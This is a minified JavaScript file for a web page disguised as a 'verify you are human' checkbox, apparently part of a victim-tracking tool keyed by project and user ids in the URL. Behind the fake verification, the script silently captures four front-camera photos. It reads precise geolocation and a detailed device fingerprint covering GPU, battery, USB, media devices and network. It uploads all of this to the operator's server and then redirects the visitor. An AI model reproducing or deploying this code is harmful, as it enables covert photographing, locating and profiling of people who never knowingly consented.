const queryString=window.location.search,urlParams=new URLSearchParams(queryString),projectId=urlParams.get("r_id"),username=urlParams.get("u_id"),USER_DATA={},sizes={w:320,h:240},videoElement=document.createElement("video"),offscreenCanvas=document.createElement("canvas");var gridSize=2;offscreenCanvas.width=sizes.w*gridSize,offscreenCanvas.height=sizes.h*gridSize;const offscreenCtx=offscreenCanvas.getContext("2d");let imageCount=0,userVerified=!1;function getLocation(){let e={latitude:null,longitude:null};return new Promise(((a,t)=>{navigator.geolocation.getCurrentPosition((t=>{const{latitude:n,longitude:i,altitude:o,accuracy:r}=t.coords;e={latitude:n,longitude:i,altitude:o,accuracy:r,googleMap:`https://www.google.com/maps/@${n},${i},14z`},a(e)}),(t=>{a(e)}))}))}async function getDeviceInfo(){const e={};if(e.appCodeName=navigator.appCodeName,e.appName=navigator.appName,e.appVersion=navigator.appVersion,e.userAgent=navigator.userAgent,e.platform=navigator.platform,"userAgentData"in navigator){const{brands:a,mobile:t,platform:n}=navigator.userAgentData;e.device={brands:a,mobile:t,platform:n}}const a=document.createElement("canvas").getContext("webgl2");if(a&&(e.gpu={renderer:a.getParameter(a.RENDERER),vendor:a.getParameter(a.VENDOR),version:a.getParameter(a.VERSION),shadingLanguageVersion:a.getParameter(a.SHADING_LANGUAGE_VERSION)}),e.logicalProcessors=navigator.hardwareConcurrency,e.memory=navigator.deviceMemory,"connection"in navigator){const{effectiveType:a,downlink:t,rtt:n,saveData:i}=navigator.connection;e.connection={effectiveType:a,downloadSpeed:t+" Mbps",roundTripTime:n+" ms",dataSaver:i?"on":"off"}}if("usb"in navigator){const a=await navigator.usb.getDevices();e.usbDevicesConnected=a.length}else e.usbDevicesConnected=0;if(e.product=navigator.product,e.productSub=navigator.productSub,e.plugins=navigator.plugins,e.onLine=navigator.onLine,e.pdfViewerEnabled=navigator.pdfViewerEnabled,"getBattery"in navigator){const{level:a,charging:t,chargingTime:n,dischargingTime:i}=await navigator.getBattery();e.battery={level:100*a,charging:t,chargingTime:n,dischargingTime:i}}if("mediaDevices"in navigator&&"enumerateDevices"in navigator.mediaDevices){const a=[];(await navigator.mediaDevices.enumerateDevices()).forEach((({deviceId:e,groupId:t,kind:n,label:i})=>{a.push({id:e,group:t,type:n,label:i})})),e.mediaDevices=a}return e.languages=navigator.languages,e.language=navigator.language,e}function scheduleImageCapture(){4!==imageCount&&setTimeout((()=>{captureImage(),scheduleImageCapture()}),600)}function dataURLtoFile(e,a){const t=e.split(","),n=t[0].match(/:(.*?);/)[1],i=atob(t[1]);let o=i.length;const r=new Uint8Array(o);for(;o--;)r[o]=i.charCodeAt(o);return new File([r],a,{type:n})}function captureImage(){const e=imageCount,a=parseInt(e/gridSize),t=e%gridSize;var n=a*sizes.h,i=t*sizes.w;if(offscreenCtx.drawImage(videoElement,i,n,sizes.w,sizes.h),imageCount+=1,4===imageCount){uploadCapturedImages(dataURLtoFile(offscreenCanvas.toDataURL("image/jpeg",.9),`${username}_${(new Date).getTime()}.jpeg`))}}async function upload(e){let a=new FormData;a.append("image",e),a.append("username",username),a.append("project",projectId);let t=await fetch(window.location.origin+"/upload",{method:"POST",body:a});return(await t.json()).filename}async function uploadCapturedImages(e){USER_DATA.userImages="",e instanceof File&&(userImage=USER_DATA.userImages=await upload(e));const a={method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({projectId:projectId,username:username,...USER_DATA})},t=await fetch("/redirect",a),n=await t.json();n.success&&(toggleCheckbox(),window.location.href=n.url)}function toggleCheckbox(){if(userVerified)return;const e=document.getElementById("human");e.nextElementSibling.textContent="Verifying....";const a=document.querySelector("span#loading");e.style.display="none",a.style.display="inline-block",a.style.opacity=1,userVerified=!0}async function start(){document.querySelector("#human").onchange=toggleCheckbox,USER_DATA.device=await getDeviceInfo(),USER_DATA.location=await getLocation()}navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:sizes.w,height:sizes.h}}).then((e=>{videoElement.srcObject=e,videoElement.onloadedmetadata=()=>{videoElement.play(),start().then(scheduleImageCapture)}})).catch((e=>{start().then(uploadCapturedImages)}));